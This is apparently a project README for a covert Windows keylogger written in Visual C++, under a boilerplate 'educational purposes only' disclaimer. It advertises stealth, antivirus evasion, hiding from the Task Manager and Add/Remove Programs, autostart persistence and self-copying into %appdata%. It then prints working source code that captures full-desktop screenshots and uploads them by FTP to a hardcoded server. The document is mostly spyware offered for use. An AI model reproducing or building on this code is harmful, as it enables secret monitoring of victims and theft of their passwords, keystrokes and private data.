
#### DISCLAIMER : OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON'T USE THEM FOR ILLEGAL ACTIVITIES. YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.

# Advance-System-Keylogger

Advance System Keylogger is 100% invisible keylogger not only for users, but also undetectable by antivirus software. Advance System keylogger Monitors all keystokes, Mouse clicks. It has a seperate process which continues capture system screenshot and send to ftp server in given time. 

Advance System Keylogger designed in visual C++ and it is run in the background in stealth mode(Hidden Window).

```
A Keylogger (short for keystroke logger) is software that tracks or logs the keys struck on your keyboard, 
typically in a covertmannerso that you don’t know that your actions are being monitored. 
This is usually done with malicious intent to collect your account information, credit card numbers,
user names, passwords, and other private data.
```

### FEATURES OF ADVANCE KEYLOGGER

- Discrete/Tamper Proof :By design, Advance Keylogger is undetectable and thus cannot be tampered with or removed by kids/employees (who are often tech savvy). It does not appear in the Registry, the Process List, the System Tray, the Task Manager, on the Desktop, or in the Add/Remove programs.

- Keystrokes Typed: See every keystroke typed even if it is deleted. This keystroke logger feature provides a reader-friendly version of all keystrokes logged along with the raw keylogging activity so you can see every detail. 

- Continuous Screenshots: Video-style playback of screenshots for programs and websites selected by you. For example, watch an email as it's being typed and edited instead of just seeing the finished product (1,000 screenshots included with purchase).

- FTP Server: Screenshot and keylogger Logfile which contain senstive user information send to ftp server (Mobile/Web/System). Powerful ftp server also write in Core Visual C++.

- AutoStart : Keylogger has functionaility to auto execute on system bootup. It Insert entry on system startup program when it is running.

- AutoCopy : Keylogger has functionaility to auto copy in %appdata%/roaming/wpdnse/ folder.

### Visual C++ Source Code

Capture Screenshot

```
void screenshot(string file){
	ULONG_PTR gdiplustoken;
	GdiplusStartupInput gdistartupinput;
	GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(& gdiplustoken,& gdistartupinput,& gdistartupoutput); //start GDI+

	HDC dc=GetDC(GetDesktopWindow());//get desktop content
	HDC dc2 = CreateCompatibleDC(dc);	 //copy context

	RECT rc0kno;

	GetClientRect(GetDesktopWindow(),&rc0kno);// get desktop size;
	int w = rc0kno.right-rc0kno.left;//width
	int h = rc0kno.bottom-rc0kno.top;//height

	HBITMAP hbitmap = CreateCompatibleBitmap(dc,w,h);//create bitmap
	HBITMAP holdbitmap = (HBITMAP) SelectObject(dc2,hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);//copy pixel from pulpit to bitmap
	Bitmap* bm= new Bitmap(hbitmap,NULL);

	UINT num;
	UINT size;

	ImageCodecInfo *imagecodecinfo;
	GetImageEncodersSize(&num,&size); //get count of codec

	imagecodecinfo = (ImageCodecInfo*)(malloc(size));
	GetImageEncoders (num,size,imagecodecinfo);//get codec

	CLSID clsidEncoder;

	for(int i=0; i < num; i++)
	{
		if(wcscmp(imagecodecinfo[i].MimeType,L"image/jpeg")==0)
			clsidEncoder = imagecodecinfo[i].Clsid;//get jpeg codec id

	}

	free(imagecodecinfo);

	wstring ws;
	ws.assign(file.begin(),file.end());//sring to wstring
	bm->Save(ws.c_str(),& clsidEncoder); //save in jpeg format
	SelectObject(dc2,holdbitmap);//Release Objects
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(),dc);
	GdiplusShutdown(gdiplustoken);

}

```

Send Screenshot to Server Via FTP

```
void ftp_scrshot_send(){

	HINTERNET hInternet;
	HINTERNET hFtpSession;

	DWORD rec_timeout = 5000;

	hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
		if(hInternet == NULL){
			log_error_file<<"Error:"<<GetLastError();
		}
		else{
			hFtpSession = InternetConnect(hInternet,"192.168.8.2",2121,NULL,NULL,INTERNET_SERVICE_FTP,0,0);
			InternetSetOption(hInternet,INTERNET_OPTION_SEND_TIMEOUT,&rec_timeout,sizeof(rec_timeout));
			if(hFtpSession == NULL){

				log_error_file<<"Error:"<<GetLastError();
			}
			else{
				if(!FtpPutFile(hFtpSession,"core32.mni","hacks/sc/dc.jpg",FTP_TRANSFER_TYPE_BINARY,0)){
					log_error_file<<"Error:"<<GetLastError();
				}
			}	
		}

	log_error_file.close();
}
```
